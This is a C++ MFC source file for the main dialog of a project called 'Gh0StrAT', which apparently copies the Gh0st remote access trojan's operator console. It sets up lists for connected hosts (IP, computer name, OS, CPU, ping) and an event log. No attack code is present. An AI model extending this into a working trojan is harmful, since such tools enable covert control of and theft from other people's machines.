
// Gh0StrATDlg.cpp: 实现文件
//

#include "stdafx.h"
#include "Gh0StrAT.h"
#include "Gh0StrATDlg.h"
#include "afxdialogex.h"
#include <winerror.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

	// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CGh0StrATDlg 对话框



CGh0StrATDlg::CGh0StrATDlg(CWnd* pParent /*=NULL*/)
	: CDialog(IDD_GH0STRAT_DIALOG, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CGh0StrATDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_Online, mOnline);
	DDX_Control(pDX, IDC_Log, mLog);
}

BEGIN_MESSAGE_MAP(CGh0StrATDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CGh0StrATDlg 消息处理程序


// 生成的消息映射函数

inline BOOL CGh0StrATDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

									// TODO: 在此添加额外的初始化代码
	CRect Temp;
	GetWindowRect(Temp);
	Temp.bottom += 20;
	MoveWindow(Temp);
	//初始化位置
	InitList();

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CGh0StrATDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CGh0StrATDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}




//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CGh0StrATDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

typedef struct {
	CString title;
	int width;
}columnName;

const int cOnlineTitle = 5;
const columnName onlineTitle[] = {
	{ CString("IP地址"),120},
	{ CString("计算机名"),150 },
	{ CString("操作系统"),120},
	{ CString("CPU"),80},
	{ CString("PING"),80}
};

const int cLogTitle = 3;
const columnName logTitle[] = {
	{ CString("信息类型"),68 },
	{ CString("时间"),100 },
	{ CString("信息内容"),660 }
};

void CGh0StrATDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	if (mLog.m_hWnd != NULL) {
		CRect Temp;
		Temp.left = 3;
		Temp.right = cx - 3;
		Temp.bottom = cy - 3;
		Temp.top = cy - 3 - cy / 3;
		mLog.MoveWindow(Temp);
	}
	if (mOnline.m_hWnd != NULL) {
		CRect Temp;
		Temp.left = 3;
		Temp.right = cx - 3;
		Temp.bottom = cy - 3 - cy / 3 - 3;
		Temp.top = Temp.bottom - cy / 3;
		mOnline.MoveWindow(Temp);
	}
}

void CGh0StrATDlg::InitList()
{
	for (int i = 0; i < cOnlineTitle; i++) {
		mOnline.InsertColumn(i, onlineTitle[i].title, 0, onlineTitle[i].width, -1);
	}
	for (int i = 0; i < cLogTitle; i++) {
		mLog.InsertColumn(i, logTitle[i].title, 0, logTitle[i].width, -1);
	}
	mOnline.SetExtendedStyle(LVS_EX_FULLROWSELECT);
	mLog.SetExtendedStyle(LVS_EX_FULLROWSELECT);

	//AddItemOnline(CString("192.168.0.1"), CString("Lang"), CString("Windows7"), CString("2.2GHZ"), CString("12"));
	//AddItemLog(true, CString("!!@@#@!$!@#$@#"));
}

void CGh0StrATDlg::AddItemOnline(CString IP, CString NAME, CString OS, CString CPU, CString PING)
{
	mOnline.InsertItem(0, IP);
	mOnline.SetItemText(0, 1, NAME);
	mOnline.SetItemText(0, 2, OS);
	mOnline.SetItemText(0, 3, CPU);
	mOnline.SetItemText(0, 4, PING);
}

void CGh0StrATDlg::AddItemLog(bool OK, CString MSG)
{
	CString strIsOK, strTime;
	if (OK) {
		strIsOK = "√";
	}
	else {
		strIsOK = "×";
	}
	CTime t = CTime::GetCurrentTime();
	strTime = t.Format("%H:%M:%S");
	mLog.InsertItem(0, strIsOK);
	mLog.SetItemText(0, 1, strTime);
	mLog.SetItemText(0, 2, MSG);
}
